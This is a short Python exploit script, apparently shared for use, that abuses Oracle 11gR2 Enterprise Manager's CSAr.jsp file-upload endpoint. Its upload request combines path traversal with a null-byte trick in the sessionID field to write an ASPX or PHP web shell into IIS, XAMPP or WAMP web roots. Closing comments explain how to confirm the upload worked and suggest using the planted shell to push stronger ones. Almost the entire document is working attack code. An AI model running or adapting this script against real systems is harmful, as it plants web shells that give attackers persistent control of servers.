### Welcome to Oracle 11gR2 UnAuthorized Uploader (and inject shell to Web Server)
### This script is written by Henry Lai (ducltm@outlook.com)
### and was inspired by the Metasploit module: Oracle Database Client System Analyzer Arbitrary File Upload
### Link: https://www.rapid7.com/db/modules/exploit/windows/oracle/client_system_analyzer_upload

### Limit of this file uploader (by default config of Oracle 11gR2): 100KB
### Attack via Oracle Enterprise Manager Web Admin (Port 1521 is Oracle DB, Port 1158 is Enterprise Manager)

import urllib.request, urllib.parse
import ssl

IP_ADDR = 'XXX.XXX.XXX.XXX'
IP_PORT = 'YYYY' # Default port: 1158
TARGET_URL = 'https://' + IP_ADDR + ':' + IP_PORT +'/em/ecm/csa/v10103/CSAr.jsp'

### Depends on which LANGUAGE you want to attack shell, un-comment one line below    
# file_name = 'tiny-shell.php'          # Github: https://github.com/rahuldraz/tiny-php-shell (3KB)
file_name = 'aspx-shell.aspx'         # Link: https://packetstormsecurity.com/files/60858/aspxshell.aspx.txt.html (6KB)

### Depend on which SYSTEM of the target server
root_path = '..\\' * 13 # WINDOWS --> From Oracle DB folder to C:\ is 13 traversal times
# root_path = '../' * ? #UNIX --> Haven't check yet

### Depends on which WEBSERVER you want to attack shell, un-comment one line below

target_path = 'inetpub\\wwwroot\\'
# target_path = 'XAMPP\\htdocs\\'
# target_path = 'WAMP\\www\\'

file_content = """"""
with open(file_name, 'r') as myfile:
    file_content = myfile.read()

file_content =  urllib.parse.quote(file_content, safe = '')

data_content = f"sessionID={root_path + target_path + file_name}\x00.xml\x0d\x0a"
data_content = data_content + file_content

data = bytes ( data_content , 'utf-8')

gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
handler = urllib.request.urlopen(TARGET_URL, data, context=gcontext )

print( handler.read().decode( 'utf-8' ) )

### If you see csaPostStatus = 0 --> Successful uploaded
### After succeesful shell, you can use that shell to upload other shell with more powerful.
